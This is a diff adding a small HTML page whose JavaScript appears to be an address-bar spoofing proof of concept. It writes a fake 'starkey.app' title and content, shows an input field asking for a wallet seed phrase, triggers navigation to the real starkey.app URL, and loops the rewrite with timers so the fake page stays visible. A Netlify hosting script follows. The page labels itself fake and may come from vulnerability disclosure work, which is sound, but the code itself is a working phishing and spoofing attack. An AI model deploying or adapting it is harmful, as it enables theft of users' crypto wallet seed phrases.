@@ -1,0 +1,23 @@
+<script>
+function spoof()
+
+{
+
+document.write("<title>starkey.app</title>");
+  
+    a= '<h1>FAKE CONTENT !!</h1><p>PLEASE INPUT YOUR SEED PHARSE HERE:<input></p>'
+
+document.write(a);
+window.location.assign("https://starkey.app/:1121");
+
+   	setTimeout(function(){
+		spoof();  // Loop makes the browser always shows the fake page.
+	}, 5000); //Improved
+
+}
+
+
+
+setInterval(spoof(),2000);
+</script>
+<script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="931ee6ad-b467-41fb-b4ba-2eaf38f5d1a5" data-app-host="app.netlify.com" data-account-tier="free"></script>
